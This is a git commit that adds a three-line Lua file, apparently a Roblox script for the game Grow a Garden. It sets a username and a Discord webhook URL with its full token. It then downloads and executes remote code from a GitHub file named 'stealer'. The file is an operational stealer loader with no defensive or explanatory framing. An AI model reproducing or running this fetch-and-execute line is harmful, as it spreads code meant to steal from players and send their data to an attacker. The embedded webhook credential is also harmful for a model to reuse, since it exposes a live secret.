4429ba21379ffdef0a20ea45abad6f6af73632b8
mralienrawr <jenjenzy842@gmail.com>
2025-05-23 15:09:17 +0800

    Create cottonblossom.lua

---
+++ cottonblossom.lua
@@ -0,0 +1,3 @@
+local Username = "pogisijove14" 
+local Webhook = "https://discord.com/api/webhooks/1375369550014709771/KOJA70rY9QYHWbdfWMyKJSzYOacQTtwo5oJ3U3usijkW0MLlhoF3hZlvbgAy6JRrZceR"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VegaXScripts/GrowAgarden/refs/heads/main/stealer"))()
